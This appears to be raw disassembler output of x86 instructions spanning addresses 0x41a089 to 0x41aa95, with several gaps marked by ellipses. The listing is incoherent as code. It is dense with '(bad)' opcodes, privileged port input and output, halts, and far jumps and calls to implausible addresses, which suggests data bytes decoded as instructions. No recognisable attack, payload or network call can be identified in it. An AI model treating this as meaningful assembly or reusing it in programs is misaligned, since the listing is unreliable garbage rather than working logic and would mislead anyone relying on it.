  41a089:	cmp    BYTE PTR [eax-0x26],bl
  41a08c:	data16 jns 0x41a06f
  41a08f:	(bad)  [esi-0x4d]
  41a092:	jmp    0x41a0cf
  41a094:	jae    0x41a02f
  41a096:	push   0x6c
  41a098:	push   0xffffffaf
  41a09a:	push   esi
  41a09b:	push   0x5d63d713
  41a0a0:	or     al,0x71
  41a0a2:	dec    cx
  41a0a4:	icebp  
  41a0a5:	nop
  41a0a6:	dec    eax
  41a0a7:	fsubr  DWORD PTR fs:[ebp+edx*4+0x7c516cd4]
  41a0af:	mul    DWORD PTR ds:0x649f87c4
  41a0b5:	sub    edi,DWORD PTR [edi+esi*8-0x23]
  41a0b9:	retf   
  41a0ba:	mov    edx,0x6479c8d4
  41a0bf:	sbb    eax,0x8995bbd0
  41a0c4:	dec    ax
  41a0c6:	int    0x2
  41a0c8:	test   eax,0xd7bd9c02
  41a0cd:	inc    ebx
  41a0ce:	dec    edx
  41a0cf:	test   DWORD PTR [esi-0x34],ebx
  41a0d2:	or     ch,BYTE PTR [edi-0x6d69215f]
  41a0d8:	fst    st(5)
  41a0da:	jg     0x41a11f
  41a0dc:	inc    esi
  41a0dd:	add    al,0xca
  41a0df:	mov    al,ds:0xd64bf423
  41a0e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0e5:	test   BYTE PTR ds:0x46020196,dl
  41a0eb:	jmp    0x4ee75a81
  41a0f0:	lea    ecx,gs:[edi]
  41a0f3:	push   ebp
  41a0f4:	gs and ebp,ebp
  41a0f7:	loopne 0x41a0b6
  41a0f9:	push   es
  41a0fa:	scas   eax,DWORD PTR es:[edi]
  41a0fb:	ret    
  41a0fc:	cwde   
  41a0fd:	ss ds fwait
  41a100:	inc    ebp
  41a101:	ss push cs
  41a103:	pop    eax
  41a104:	scas   al,BYTE PTR es:[edi]
  41a105:	or     eax,0x717e494a
  41a10a:	scas   eax,DWORD PTR es:[edi]
  41a10b:	adc    al,BYTE PTR [eax]
  41a10d:	scas   eax,DWORD PTR es:[edi]
  41a10e:	test   DWORD PTR [edx],edi
  41a110:	retf   
  41a111:	sbb    al,0xb5
  41a113:	mov    ecx,0x3ae46cea
  41a118:	mov    ebx,DWORD PTR [ecx+0x19d7db7e]
  41a11e:	sti    
  41a11f:	stos   DWORD PTR es:[edi],eax
  41a120:	mov    ah,0xf
  41a122:	mov    al,0x37
  41a124:	cmp    eax,0xa976cb20
  41a129:	pushf  
  41a12a:	sub    BYTE PTR [esi],bl
  41a12c:	cmp    esp,DWORD PTR [ecx+0x2d8876a]
  41a132:	inc    edi
  41a133:	adc    ebx,esi
	...
  41a195:	add    BYTE PTR [esp+ecx*1],bl
  41a198:	std    
  41a199:	sbb    ebp,edi
  41a19b:	stc    
  41a19c:	cld    
  41a19d:	or     eax,0xe0cd0383
  41a1a2:	mov    ebx,0xbb2bf6f7
  41a1a7:	adc    al,BYTE PTR [ecx]
  41a1a9:	add    BYTE PTR [edi],al
  41a1ab:	add    DWORD PTR [eax],eax
  41a1ad:	add    dh,dl
  41a1af:	and    DWORD PTR [edx-0x66],0x47
  41a1b3:	lea    ecx,[ecx-0x4538b1c8]
  41a1b9:	shr    DWORD PTR [ecx+0x59],1
  41a1bc:	mov    ds:0xca47dc62,eax
  41a1c1:	dec    eax
  41a1c2:	and    al,0x0
  41a1c4:	lods   al,BYTE PTR ds:[esi]
  41a1c5:	push   ebp
  41a1c6:	xor    cl,BYTE PTR [ebx-0x4488caff]
  41a1cc:	stc    
  41a1cd:	xchg   edx,eax
  41a1ce:	or     ebp,edx
  41a1d0:	inc    edi
  41a1d1:	je     0x41a177
  41a1d3:	cdq    
  41a1d4:	hlt    
  41a1d5:	in     al,0x60
  41a1d7:	(bad)  
  41a1d8:	jmp    0x41a1d0
  41a1da:	and    DWORD PTR [ebx+0xc],ecx
  41a1dd:	fnstenv ds:0x5122b7ac
  41a1e3:	sbb    al,0x5d
  41a1e5:	xchg   edx,eax
  41a1e6:	push   ebp
  41a1e7:	out    0xb2,al
  41a1e9:	cli    
  41a1ea:	or     eax,0xca6151db
  41a1ef:	and    ah,BYTE PTR [edi]
  41a1f1:	push   edx
  41a1f2:	jmp    0x41a266
  41a1f4:	ins    DWORD PTR es:[edi],dx
  41a1f5:	pop    eax
  41a1f6:	test   BYTE PTR [eax],ch
  41a1f8:	cmp    BYTE PTR [esi],dh
  41a1fa:	sbb    DWORD PTR fs:[eax+0x56ca98a6],ecx
  41a201:	aam    0x23
  41a203:	int3   
  41a204:	fisubr WORD PTR [edx-0x59569add]
  41a20a:	cmp    eax,0xe1ac6f00
  41a20f:	stos   DWORD PTR es:[edi],eax
  41a210:	inc    esp
  41a211:	add    al,0x50
  41a213:	pop    ss
  41a214:	not    DWORD PTR [ebx]
  41a216:	mov    edx,0xf5a4e8d0
  41a21b:	sub    al,0x52
  41a21d:	add    ebp,DWORD PTR [ebp+esi*2+0x31c8faa6]
  41a224:	scas   al,BYTE PTR es:[edi]
  41a225:	cmp    ecx,DWORD PTR [eax+0x2]
  41a228:	and    eax,0x19c038f9
  41a22d:	or     eax,0xdb33bf38
  41a232:	mov    ?,ecx
  41a234:	mov    ds:0x38bd9e5c,al
  41a239:	(bad)  
  41a23a:	popf   
  41a23b:	loopne 0x41a21c
  41a23d:	push   ebp
  41a23e:	sub    al,0x2b
  41a240:	dec    edi
  41a241:	adc    DWORD PTR [ebp+0x68],edi
  41a244:	das    
  41a245:	fisttp QWORD PTR [edx-0x6]
  41a248:	test   BYTE PTR [ebp-0x4594b5ef],cl
  41a24e:	lods   eax,DWORD PTR ds:[esi]
  41a24f:	push   ds
  41a250:	jns    0x41a27a
  41a252:	add    ebx,0xc99d26f4
  41a258:	fsubr  QWORD PTR [esi]
  41a25a:	add    DWORD PTR [ecx+0x6af53fbb],0xf47f7790
  41a264:	sahf   
  41a265:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a266:	sub    DWORD PTR [ebx+0x67],esi
  41a269:	mov    DWORD PTR [ebx+0x146c868c],edx
  41a26f:	xchg   edx,eax
  41a270:	cld    
  41a271:	pop    eax
  41a272:	and    DWORD PTR ds:[edi],eax
  41a275:	call   0x373b76cb
  41a27a:	ja     0x41a2bb
  41a27c:	push   ebp
  41a27d:	aas    
  41a27e:	and    eax,0xf08e5523
  41a283:	test   ebx,ecx
  41a285:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a286:	repz pop edx
  41a288:	(bad)  [esi+0x2c82e1ad]
  41a28e:	scas   eax,DWORD PTR es:[edi]
  41a28f:	cdq    
  41a290:	pop    esi
  41a291:	sub    al,0x65
  41a293:	adc    al,0x9d
  41a295:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a296:	xchg   ebx,eax
  41a297:	push   ax
  41a299:	jne    0x41a2b0
  41a29b:	stos   BYTE PTR es:[edi],al
  41a29c:	mov    cl,0xd0
  41a29e:	jo     0x41a2b8
  41a2a0:	repnz test eax,0xa38991a6
  41a2a6:	xor    al,0x20
  41a2a8:	sub    dh,BYTE PTR cs:[edx+0x79431784]
  41a2af:	jns    0x41a252
  41a2b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2b2:	imul   edx,DWORD PTR [ebx+0x2a],0x0
	...
  41a314:	add    BYTE PTR [eax],al
  41a316:	neg    DWORD PTR [eax-0x58]
  41a319:	adc    ebp,DWORD PTR [edi+0x63fcfff3]
  41a31f:	fadd   st,st(1)
  41a321:	mov    al,0x31
  41a323:	cmp    DWORD PTR [eax+0x113c282],edi
  41a329:	add    BYTE PTR [edi],al
  41a32b:	add    DWORD PTR [eax],eax
  41a32d:	add    BYTE PTR [edx],ch
  41a32f:	ins    BYTE PTR es:[edi],dx
  41a330:	jns    0x41a2e4
  41a332:	sbb    al,bh
  41a334:	fst    QWORD PTR [ebx-0x4e]
  41a337:	shl    cl,0x76
  41a33a:	rcr    BYTE PTR [ecx-0x74],cl
  41a33d:	mov    DWORD PTR [edx-0x3],eax
  41a340:	jb     0x41a3a6
  41a342:	mov    dl,0x85
  41a344:	call   0x2503:0x71228c2b
  41a34b:	unpckhps xmm6,XMMWORD PTR [esi-0x5f870127]
  41a352:	test   BYTE PTR [esi],0xe2
  41a355:	and    eax,0x8bd3f1f7
  41a35a:	js     0x41a2e0
  41a35c:	xchg   ecx,eax
  41a35d:	push   ds
  41a35e:	or     eax,0x81badcc2
  41a363:	ja     0x41a362
  41a365:	mov    ds:0x7090cd81,al
  41a36a:	inc    edi
  41a36b:	jno    0x41a3a7
  41a36d:	add    ah,BYTE PTR [edx+0x3d]
  41a370:	inc    ebp
  41a371:	sub    eax,0x4849aa5
  41a376:	xlat   BYTE PTR ds:[ebx]
  41a377:	mov    ds:0xc8f51ed6,eax
  41a37c:	rcl    BYTE PTR [ecx],cl
  41a37e:	test   al,0x67
  41a380:	xor    al,0x29
  41a382:	aas    
  41a383:	es mov bh,0xad
  41a386:	xchg   dl,ah
  41a388:	sub    bl,BYTE PTR [edx]
  41a38a:	mov    ds:0xfc4d191e,al
  41a38f:	(bad)  
  41a390:	nop
  41a391:	sub    DWORD PTR [esi+0x516741f9],ebp
  41a397:	and    edx,0x2f
  41a39a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a39b:	xchg   DWORD PTR [ecx],ecx
  41a39d:	push   edx
  41a39e:	or     cl,ah
  41a3a0:	pusha  
  41a3a1:	xchg   esi,eax
  41a3a2:	cli    
  41a3a3:	dec    ebp
  41a3a4:	jae    0x41a328
  41a3a6:	pop    esp
  41a3a7:	and    ecx,esp
  41a3a9:	icebp  
  41a3aa:	pop    esp
  41a3ab:	add    dh,BYTE PTR [ecx+0x59]
  41a3ae:	loope  0x41a3f7
  41a3b0:	or     edx,DWORD PTR [ebx-0x2d]
  41a3b3:	adc    BYTE PTR [esi+0x3492d42d],al
  41a3b9:	ret    
  41a3ba:	cmc    
  41a3bb:	out    dx,al
  41a3bc:	or     al,ah
  41a3be:	mov    es,WORD PTR [esi+0x76]
  41a3c1:	cmp    BYTE PTR [edx-0x54],al
  41a3c4:	mov    ds:0xf2c7f748,al
  41a3c9:	imul   esi,ecx,0x54
  41a3cc:	mov    edx,0xc31413fe
  41a3d1:	mov    ecx,0x430b8c48
  41a3d6:	rol    DWORD PTR [ecx-0x6b],1
  41a3d9:	(bad)  [ebp-0x46]
  41a3dc:	xchg   ecx,eax
  41a3dd:	mov    bl,0x3f
  41a3df:	mov    ebx,0x7e1d5f37
  41a3e4:	out    dx,al
  41a3e5:	sub    DWORD PTR [ebp+0x3edd58e],0xffffffbd
  41a3ec:	js     0x41a463
  41a3ee:	es (bad) 
  41a3f0:	std    
  41a3f1:	or     eax,edx
  41a3f3:	push   edi
  41a3f4:	pop    esp
  41a3f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3f6:	jne    0x41a380
  41a3f8:	or     BYTE PTR [esi],dl
  41a3fa:	adc    esi,ecx
  41a3fc:	push   0x3785228
  41a401:	mov    ds,WORD PTR [ebp+0x6e6efd1f]
  41a407:	pop    ds
  41a408:	(bad)  
  41a409:	mov    bh,0x44
  41a40b:	jns    0x41a3f8
  41a40d:	mov    cl,0xf8
  41a40f:	fidiv  DWORD PTR [eax+0x51104185]
  41a415:	daa    
  41a416:	dec    ebx
  41a417:	lea    ebp,[ebp-0x53]
  41a41a:	(bad)  
  41a41c:	jns    0x41a48d
  41a41e:	mov    ds:0xc8d1e4a1,al
  41a423:	pusha  
  41a424:	mov    edi,0x64c66342
  41a429:	push   es
  41a42a:	cmc    
  41a42b:	in     eax,0x67
  41a42d:	not    ch
  41a42f:	cmp    dl,BYTE PTR [esi+0x69d18acc]
	...
  41a495:	add    BYTE PTR [edi-0xf0307e],bh
  41a49b:	dec    edi
  41a49c:	push   DWORD PTR [edx+0x6df04d13]
  41a4a2:	das    
  41a4a3:	imul   DWORD PTR [edi]
  41a4a5:	dec    ebp
  41a4a6:	leave  
  41a4a7:	adc    al,0x1
  41a4a9:	add    BYTE PTR [edi],al
  41a4ab:	add    DWORD PTR [eax],eax
  41a4ad:	add    BYTE PTR [edx+edx*8-0x5ad781c9],al
  41a4b4:	xor    DWORD PTR [ecx],0xffffffa8
  41a4b7:	pusha  
  41a4b8:	cmp    al,0xcd
  41a4ba:	jmp    0x71e1:0xf350cd6e
  41a4c1:	iret   
  41a4c2:	or     ah,dl
  41a4c4:	je     0x41a458
  41a4c6:	out    dx,eax
  41a4c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4c8:	fdecstp 
  41a4ca:	push   ss
  41a4cb:	adc    al,0xf7
  41a4cd:	sbb    esi,DWORD PTR [ebp-0x69]
  41a4d0:	call   0xaef69ada
  41a4d5:	lea    ebx,[eax+edx*2+0x73]
  41a4d9:	xchg   edi,eax
  41a4da:	sbb    al,0xf6
  41a4dc:	add    cl,BYTE PTR ds:0xffdfcc1b
  41a4e2:	pushf  
  41a4e3:	or     al,0xe1
  41a4e5:	outs   dx,DWORD PTR ds:[esi]
  41a4e6:	sti    
  41a4e7:	xchg   esp,eax
  41a4e8:	or     al,0x97
  41a4ea:	pop    es
  41a4eb:	push   0x858edb7f
  41a4f0:	jae    0x41a538
  41a4f2:	jle    0x41a557
  41a4f4:	popa   
  41a4f5:	in     al,dx
  41a4f6:	in     al,dx
  41a4f7:	sub    BYTE PTR [edx+ebp*1],bl
  41a4fa:	push   eax
  41a4fb:	mov    ds:0x60862537,al
  41a500:	mov    ebx,cs
  41a502:	push   0x5e
  41a504:	(bad)  
  41a506:	mov    bl,0x1f
  41a508:	(bad)  
  41a50c:	jl     0x41a4a6
  41a50e:	int3   
  41a50f:	ficomp DWORD PTR [edi+ecx*4-0x919962e]
  41a516:	add    al,0x45
  41a518:	bound  ebp,QWORD PTR [ebp+0x4ff43017]
  41a51e:	push   ebx
  41a51f:	or     ch,BYTE PTR [edx-0x57]
  41a522:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41a524:	leave  
  41a525:	mov    bl,0x66
  41a527:	ins    DWORD PTR es:[edi],dx
  41a528:	fstp   QWORD PTR [esi+0x9db446f]
  41a52e:	dec    esp
  41a52f:	test   BYTE PTR [ecx],ch
  41a531:	test   DWORD PTR [edx+0x3d],eax
  41a534:	ds ffreep st(1)
  41a538:	and    eax,0xf619b354
  41a53d:	mov    cl,BYTE PTR [eax-0x6e]
  41a540:	mov    ch,0xda
  41a542:	in     al,0xdb
  41a544:	add    eax,0x8428e73d
  41a549:	call   0x71010dad
  41a54e:	xlat   BYTE PTR ds:[ebx]
  41a54f:	jmp    0xdb28:0x53ed89e
  41a556:	int3   
  41a557:	add    esi,DWORD PTR [ecx-0x15f2c0e9]
  41a55d:	retf   0x4797
  41a560:	fidiv  WORD PTR [ebx]
  41a562:	jne    0x41a51c
  41a564:	je     0x41a574
  41a566:	add    al,0xf2
  41a568:	push   eax
  41a569:	mov    ah,0x79
  41a56b:	(bad)  
  41a56c:	inc    eax
  41a56d:	mov    eax,ds:0x37caad7a
  41a572:	pop    edi
  41a573:	fsubr  QWORD PTR [ecx+ebp*1]
  41a576:	dec    eax
  41a577:	ins    BYTE PTR es:[edi],dx
  41a578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a579:	adc    BYTE PTR ss:[esi-0x7d],0xec
  41a57e:	dec    edi
  41a57f:	xor    BYTE PTR [ebp+0x51066da5],al
  41a585:	xor    BYTE PTR [ebx+0x2b],bl
  41a588:	jbe    0x41a55f
  41a58a:	or     dl,BYTE PTR [edi-0x5143f603]
  41a590:	data16 int 0xef
  41a593:	dec    esp
  41a594:	fs inc edx
  41a596:	retf   0xa65a
  41a599:	pop    esp
  41a59a:	cmc    
  41a59b:	jmp    0x41a5a5
  41a59d:	mov    ebx,0xcaffa91c
  41a5a2:	or     eax,0x164742ab
  41a5a7:	jge    0x41a5f1
  41a5a9:	mov    bl,0x9
  41a5ab:	fwait
  41a5ac:	cmp    DWORD PTR [edi-0x20],ecx
  41a5af:	sub    eax,0x643acccf
  41a5b4:	push   edx
	...
  41a615:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a619:	inc    ecx
  41a61a:	ja     0x41a687
  41a61c:	pop    esp
  41a61d:	aas    
  41a61e:	pop    ecx
  41a61f:	jmp    0x41a5e9
  41a621:	mov    edx,0x5f404677
  41a626:	rcl    BYTE PTR ds:0x1070001,1
  41a62c:	add    BYTE PTR [eax],al
  41a62e:	js     0x41a61e
  41a630:	xchg   DWORD PTR [edi-0x7],ecx
  41a633:	mov    edx,ebp
  41a635:	cpuid  
  41a637:	out    dx,eax
  41a638:	sub    ah,BYTE PTR [ebp+0x6921272b]
  41a63e:	or     BYTE PTR [edx+0x24],cl
  41a641:	add    DWORD PTR [esi+ebx*2],ecx
  41a644:	rol    BYTE PTR [eax-0x23],cl
  41a647:	inc    esi
  41a648:	out    0x65,eax
  41a64a:	adc    ch,BYTE PTR [edx+esi*1-0x50]
  41a64e:	ret    
  41a64f:	cmp    eax,0x16b551d4
  41a654:	nop
  41a655:	cwde   
  41a656:	push   ebp
  41a657:	mov    BYTE PTR cs:[ecx-0x70],cl
  41a65b:	add    bh,BYTE PTR [ecx-0x19]
  41a65e:	xchg   ebx,eax
  41a65f:	fsubr  DWORD PTR [eax+eax*4+0x76b953c8]
  41a666:	jmp    0x6db1:0x263ac9ea
  41a66d:	repnz mov DWORD PTR [edi-0xe8c86e9],ebx
  41a674:	add    BYTE PTR [eax+0x211add2f],ch
  41a67a:	sbb    eax,0xad4d5393
  41a67f:	stc    
  41a680:	aaa    
  41a681:	cmp    cl,BYTE PTR [ecx+0x35]
  41a684:	ins    DWORD PTR es:[edi],dx
  41a685:	ds popf 
  41a687:	call   0x92e853a9
  41a68c:	(bad)
  41a68f:	in     eax,dx
  41a690:	cli    
  41a691:	or     al,0xcf
  41a693:	xchg   ebx,eax
  41a694:	fs loopne 0x41a6cd
  41a697:	adc    edi,DWORD PTR [esi+0x6522b3bb]
  41a69d:	xchg   edi,eax
  41a69e:	fistp  WORD PTR [edi+0x62]
  41a6a1:	xor    al,BYTE PTR [edi]
  41a6a3:	cli    
  41a6a4:	and    al,ch
  41a6a6:	test   BYTE PTR [eax-0x10],0x97
  41a6aa:	jl     0x41a64f
  41a6ac:	cmp    ebp,DWORD PTR [edx+0x7f]
  41a6af:	jno    0x41a698
  41a6b1:	ret    
  41a6b2:	sbb    ecx,edx
  41a6b4:	outs   dx,BYTE PTR ds:[esi]
  41a6b5:	push   ds
  41a6b6:	gs int3 
  41a6b8:	repnz mov bh,0x32
  41a6bb:	test   ecx,edi
  41a6bd:	in     eax,0x89
  41a6bf:	adc    al,0x14
  41a6c1:	outs   dx,BYTE PTR ds:[esi]
  41a6c2:	nop
  41a6c3:	icebp  
  41a6c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6c5:	lods   al,BYTE PTR ds:[esi]
  41a6c6:	sub    DWORD PTR [edx],ebx
  41a6c8:	icebp  
  41a6c9:	retf   0x8650
  41a6cc:	shr    DWORD PTR [eax+0x724784b3],cl
  41a6d2:	int    0xb
  41a6d4:	jnp    0x41a710
  41a6d6:	out    dx,al
  41a6d7:	pop    ebp
  41a6d8:	cmp    ebx,0x4cbb2379
  41a6de:	imul   eax,DWORD PTR [esi+0x3724c1d],0xf8e92b0b
  41a6e8:	lea    eax,[ebx-0x3]
  41a6eb:	pop    ds
  41a6ec:	fsubr  DWORD PTR [edx+ebp*1+0x1f]
  41a6f0:	pop    ebp
  41a6f1:	add    al,0x63
  41a6f3:	pop    esi
  41a6f4:	mov    dl,al
  41a6f6:	ins    DWORD PTR es:[edi],dx
  41a6f7:	nop
  41a6f8:	fs jmp 0x90e6:0xb79f5cd
  41a700:	aas    
  41a701:	mov    bl,0x3b
  41a703:	mov    ebx,0x44f974cf
  41a708:	shl    DWORD PTR [ebp-0x3d6ba1a1],0xb1
  41a70f:	scas   al,BYTE PTR es:[edi]
  41a710:	js     0x41a6a8
  41a712:	aam    0xbd
  41a714:	imul   esi,DWORD PTR [eax+0x2127934b],0xe399d533
  41a71e:	add    DWORD PTR [esi-0x71],edi
  41a721:	or     DWORD PTR [edx+0x6678f0c0],eax
  41a727:	xchg   bl,ch
  41a729:	mov    edi,DWORD PTR [ecx+0x501a69a]
  41a72f:	sub    al,0x6c
  41a731:	add    al,0x78
  41a733:	gs int3 
	...
  41a795:	add    bl,dh
  41a797:	xchg   edi,eax
  41a798:	jae    0x41a721
  41a79a:	ja     0x41a783
  41a79c:	div    edi
  41a79e:	fisttp QWORD PTR [ebx-0x6aeeaf58]
  41a7a4:	neg    DWORD PTR ds:0x116d7
  41a7aa:	pop    es
  41a7ab:	add    DWORD PTR [eax],eax
  41a7ad:	add    BYTE PTR [esi+0x51],dh
  41a7b0:	xor    dl,BYTE PTR [ebp-0x76]
  41a7b3:	ins    DWORD PTR es:[edi],dx
  41a7b4:	or     DWORD PTR [eax-0xf],edx
  41a7b7:	lds    ax,DWORD PTR [edi-0x59]
  41a7bb:	xor    eax,DWORD PTR [edx+0x3d0a3489]
  41a7c1:	sub    DWORD PTR [edi],ecx
  41a7c3:	lock inc ecx
  41a7c5:	mov    ecx,0x8b79133a
  41a7ca:	jg     0x41a817
  41a7cc:	sub    eax,0x6f046129
  41a7d1:	add    al,0x62
  41a7d3:	or     ecx,DWORD PTR [ecx-0x79]
  41a7d6:	pusha  
  41a7d7:	ins    DWORD PTR es:[edi],dx
  41a7d8:	jecxz  0x41a841
  41a7da:	lods   al,BYTE PTR ds:[esi]
  41a7db:	sub    esi,edi
  41a7dd:	cmc    
  41a7de:	jne    0x41a789
  41a7e0:	and    edi,ebx
  41a7e2:	dec    ecx
  41a7e3:	and    al,cl
  41a7e5:	icebp  
  41a7e6:	push   eax
  41a7e7:	lods   eax,DWORD PTR ds:[esi]
  41a7e8:	xchg   edx,eax
  41a7e9:	sub    cl,BYTE PTR [edx+0x4cf468b6]
  41a7ef:	aaa    
  41a7f0:	mov    al,ds:0x26674851
  41a7f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7f6:	dec    edx
  41a7f7:	sub    eax,0xde3ce982
  41a7fc:	mov    ch,0x4a
  41a7ff:	shl    DWORD PTR ds:0x953f12aa,cl
  41a805:	loopne 0x41a7de
  41a807:	or     ah,ah
  41a809:	ficom  WORD PTR [edx+0x7]
  41a80c:	xchg   edi,eax
  41a80d:	mov    al,ds:0xd8dc3888
  41a812:	stos   DWORD PTR es:[edi],eax
  41a813:	jae    0x41a80c
  41a815:	mov    ch,dl
  41a817:	sbb    DWORD PTR [ecx+0x5d72974c],0x92a729e0
  41a821:	aaa    
  41a822:	arpl   si,si
  41a824:	and    ebp,esp
  41a826:	in     al,dx
  41a827:	out    dx,eax
  41a828:	cli    
  41a829:	mov    bh,0xfd
  41a82b:	jmp    0x6a01fc3e
  41a830:	(bad)  
  41a831:	mov    cl,0x29
  41a833:	jo     0x41a831
  41a835:	dec    edi
  41a836:	xchg   esp,eax
  41a837:	cmp    eax,0x90281a5
  41a83c:	imul   edx,DWORD PTR [edi+0x4d],0x16
  41a840:	cs pop eax
  41a842:	push   ebp
  41a843:	xor    al,BYTE PTR [eax-0x624c9efe]
  41a849:	inc    esp
  41a84a:	xor    al,0xa1
  41a84c:	(bad)  
  41a84d:	shr    BYTE PTR [ecx+0x1a61a939],1
  41a853:	xor    dh,bl
  41a855:	scas   eax,DWORD PTR es:[edi]
  41a856:	cmp    edi,eax
  41a858:	js     0x41a8c8
  41a85a:	jmp    0x4b16bfc6
  41a85f:	stos   DWORD PTR es:[edi],eax
  41a860:	mov    bl,0x8a
  41a862:	xor    DWORD PTR [ebx+0x1f421897],0xffffff8e
  41a869:	rcl    DWORD PTR [ebp+0x3a1696c6],1
  41a86f:	scas   eax,DWORD PTR es:[edi]
  41a870:	pop    ds
  41a871:	mov    BYTE PTR ds:0x996adc3,ah
  41a877:	and    BYTE PTR [ebx+esi*1],dl
  41a87a:	daa    
  41a87b:	in     al,0xbd
  41a87d:	dec    DWORD PTR [esi]
  41a87f:	jbe    0x41a83f
  41a881:	xor    bl,BYTE PTR [eax-0x2e]
  41a884:	xchg   ecx,eax
  41a885:	jge    0x41a8d6
  41a887:	adc    al,BYTE PTR [eax-0x6b086611]
  41a88d:	pop    es
  41a88e:	jae    0x41a858
  41a890:	sub    eax,0x61e9be36
  41a895:	dec    edi
  41a896:	das    
  41a897:	(bad)  
  41a898:	mov    bl,0x7d
  41a89a:	arpl   WORD PTR [esi-0x5b19db90],bp
  41a8a0:	je     0x41a87a
  41a8a2:	mov    ebx,0x2c79c03b
  41a8a7:	cwde   
  41a8a8:	sub    BYTE PTR [ebx+0x37afd54d],dl
  41a8ae:	pusha  
  41a8af:	(bad)  
  41a8b0:	pop    edx
  41a8b1:	out    0xe8,eax
  41a8b3:	jbe    0x41a911
	...
  41a915:	add    BYTE PTR ds:0xcf4a867e,dh
  41a91b:	cli    
  41a91c:	std    
  41a91d:	jg     0x41a90a
  41a91f:	mov    ds:0xe59323e,al
  41a924:	push   edx
  41a925:	icebp  
  41a926:	ficom  WORD PTR [edi]
  41a928:	add    DWORD PTR [eax],eax
  41a92a:	pop    es
  41a92b:	add    DWORD PTR [eax],eax
  41a92d:	add    BYTE PTR [esi+ebx*2],bl
  41a930:	loope  0x41a923
  41a932:	sbb    dh,BYTE PTR [ebx+0x377b4714]
  41a938:	mov    ebx,0xd356aee6
  41a93d:	test   eax,0x5000c192
  41a942:	push   0xc39f09c8
  41a947:	lea    esp,[esi]
  41a949:	mov    DWORD PTR [eax-0x11],edi
  41a94c:	or     esp,DWORD PTR [ebx-0x46]
  41a94f:	ror    bl,1
  41a951:	fiadd  DWORD PTR [edx]
  41a953:	imul   DWORD PTR [edx*2+0x4214597a]
  41a95a:	inc    ebp
  41a95b:	and    BYTE PTR [edi-0x69],ch
  41a95e:	pop    ebp
  41a95f:	xchg   edx,eax
  41a960:	std    
  41a961:	mov    edx,0xa424c9a1
  41a966:	(bad)  [ebx]
  41a968:	mov    esp,0xbd12109d
  41a96d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a96e:	scas   eax,DWORD PTR es:[edi]
  41a96f:	shl    DWORD PTR [esi+0x84c007b],0x5c
  41a976:	loop   0x41a9b2
  41a978:	pop    ecx
  41a979:	or     al,0x1
  41a97b:	fsubp  st(0),st
  41a97d:	cmp    edx,DWORD PTR [edi-0x77]
  41a980:	(bad)  
  41a981:	cmp    BYTE PTR [ecx+0x36],bl
  41a984:	or     DWORD PTR [ecx],ecx
  41a986:	sub    esi,edx
  41a988:	aas    
  41a989:	sub    ecx,DWORD PTR [edi]
  41a98b:	jnp    0x41a9f6
  41a98d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a98e:	fisub  WORD PTR [esi]
  41a990:	sbb    al,0x2b
  41a992:	scas   eax,DWORD PTR es:[edi]
  41a993:	stc    
  41a994:	inc    eax
  41a995:	or     esp,DWORD PTR [ebx+0x63]
  41a998:	add    BYTE PTR [esi],dl
  41a99a:	(bad)  
  41a99b:	enter  0x25b6,0xc8
  41a99f:	mov    bl,0x6e
  41a9a1:	pusha  
  41a9a2:	stc    
  41a9a3:	stc    
  41a9a4:	xor    esi,edi
  41a9a6:	or     eax,DWORD PTR [ebx+0x3c]
  41a9a9:	fucomip st,st(1)
  41a9ab:	lock pop esp
  41a9ad:	xchg   ebp,eax
  41a9ae:	call   0xbb22:0xb54dcd05
  41a9b5:	std    
  41a9b6:	stc    
  41a9b7:	mov    ebx,0x7bcab5a3
  41a9bc:	push   0xd40d8263
  41a9c1:	pop    eax
  41a9c2:	int    0x8e
  41a9c4:	aaa    
  41a9c5:	lods   eax,DWORD PTR ds:[esi]
  41a9c6:	xchg   ebp,eax
  41a9c7:	push   0x21
  41a9c9:	inc    eax
  41a9ca:	mov    BYTE PTR [edx+0x3032438e],0x25
  41a9d1:	mov    cl,0xe0
  41a9d3:	jmp    0xbafe13bf
  41a9d8:	xchg   edx,eax
  41a9d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9da:	cmp    DWORD PTR [ebx],edi
  41a9dc:	(bad)  [ebp+0x7ae8c712]
  41a9e2:	stc    
  41a9e3:	jg     0x41aa31
  41a9e5:	(bad)  
  41a9e7:	ja     0x41aa42
  41a9e9:	clc    
  41a9ea:	dec    ebx
  41a9eb:	int    0xb4
  41a9ed:	cli    
  41a9ee:	sahf   
  41a9ef:	xchg   esp,eax
  41a9f0:	xchg   BYTE PTR [esi],cl
  41a9f2:	push   cs
  41a9f3:	xchg   esp,eax
  41a9f4:	das    
  41a9f5:	push   cs
  41a9f6:	ja     0x41a9df
  41a9f8:	std    
  41a9f9:	ret    0xa79f
  41a9fc:	xor    DWORD PTR [esi+0x335dec38],esi
  41aa02:	add    dh,cl
  41aa04:	and    BYTE PTR [bx+si+0x2a],cl
  41aa08:	out    dx,al
  41aa09:	ss mov ebx,0xbc14ad43
  41aa0f:	xchg   esi,eax
  41aa10:	mov    ebp,0x245b6215
  41aa15:	pushw  es
  41aa17:	repz out dx,al
  41aa19:	xor    eax,0x59a8b773
  41aa1e:	addr16 jmp 0x41aa3c
  41aa21:	enter  0x4b6a,0x10
  41aa25:	xlat   BYTE PTR ds:[ebx]
  41aa26:	icebp  
  41aa27:	dec    eax
  41aa28:	inc    esp
  41aa29:	push   edx
  41aa2a:	out    dx,al
  41aa2b:	sub    BYTE PTR [edi+0x78],bl
  41aa2e:	int    0x85
  41aa30:	aas    
  41aa31:	sbb    ah,BYTE PTR es:[edi]
  41aa34:	into   
	...
  41aa95:	add    bh,dh
